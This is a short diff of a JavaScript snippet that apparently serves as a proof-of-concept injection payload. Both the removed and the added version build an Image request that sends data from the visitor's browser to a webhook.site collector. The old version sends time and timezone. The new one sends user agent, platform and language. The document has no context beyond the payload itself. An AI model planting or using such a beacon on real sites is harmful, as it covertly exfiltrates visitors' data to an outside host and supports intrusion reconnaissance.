@@ -1,16 +1,12 @@
-<html>
-<body>
-
 <script>
 
-var serverTime = new Date().toString();
-var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+var info =
+navigator.userAgent + "|" +
+navigator.platform + "|" +
+navigator.language;
 
 new Image().src =
-"https://webhook.site/de72465a-4cd7-4ab7-903a-e2adf31ea27f/proof?" +
-encodeURIComponent("time="+serverTime+"&tz="+timezone);
+"https://webhook.site/de72465a-4cd7-4ab7-903a-e2adf31ea27f/env-" +
+encodeURIComponent(info);
 
 </script>
-
-</body>
-</html>
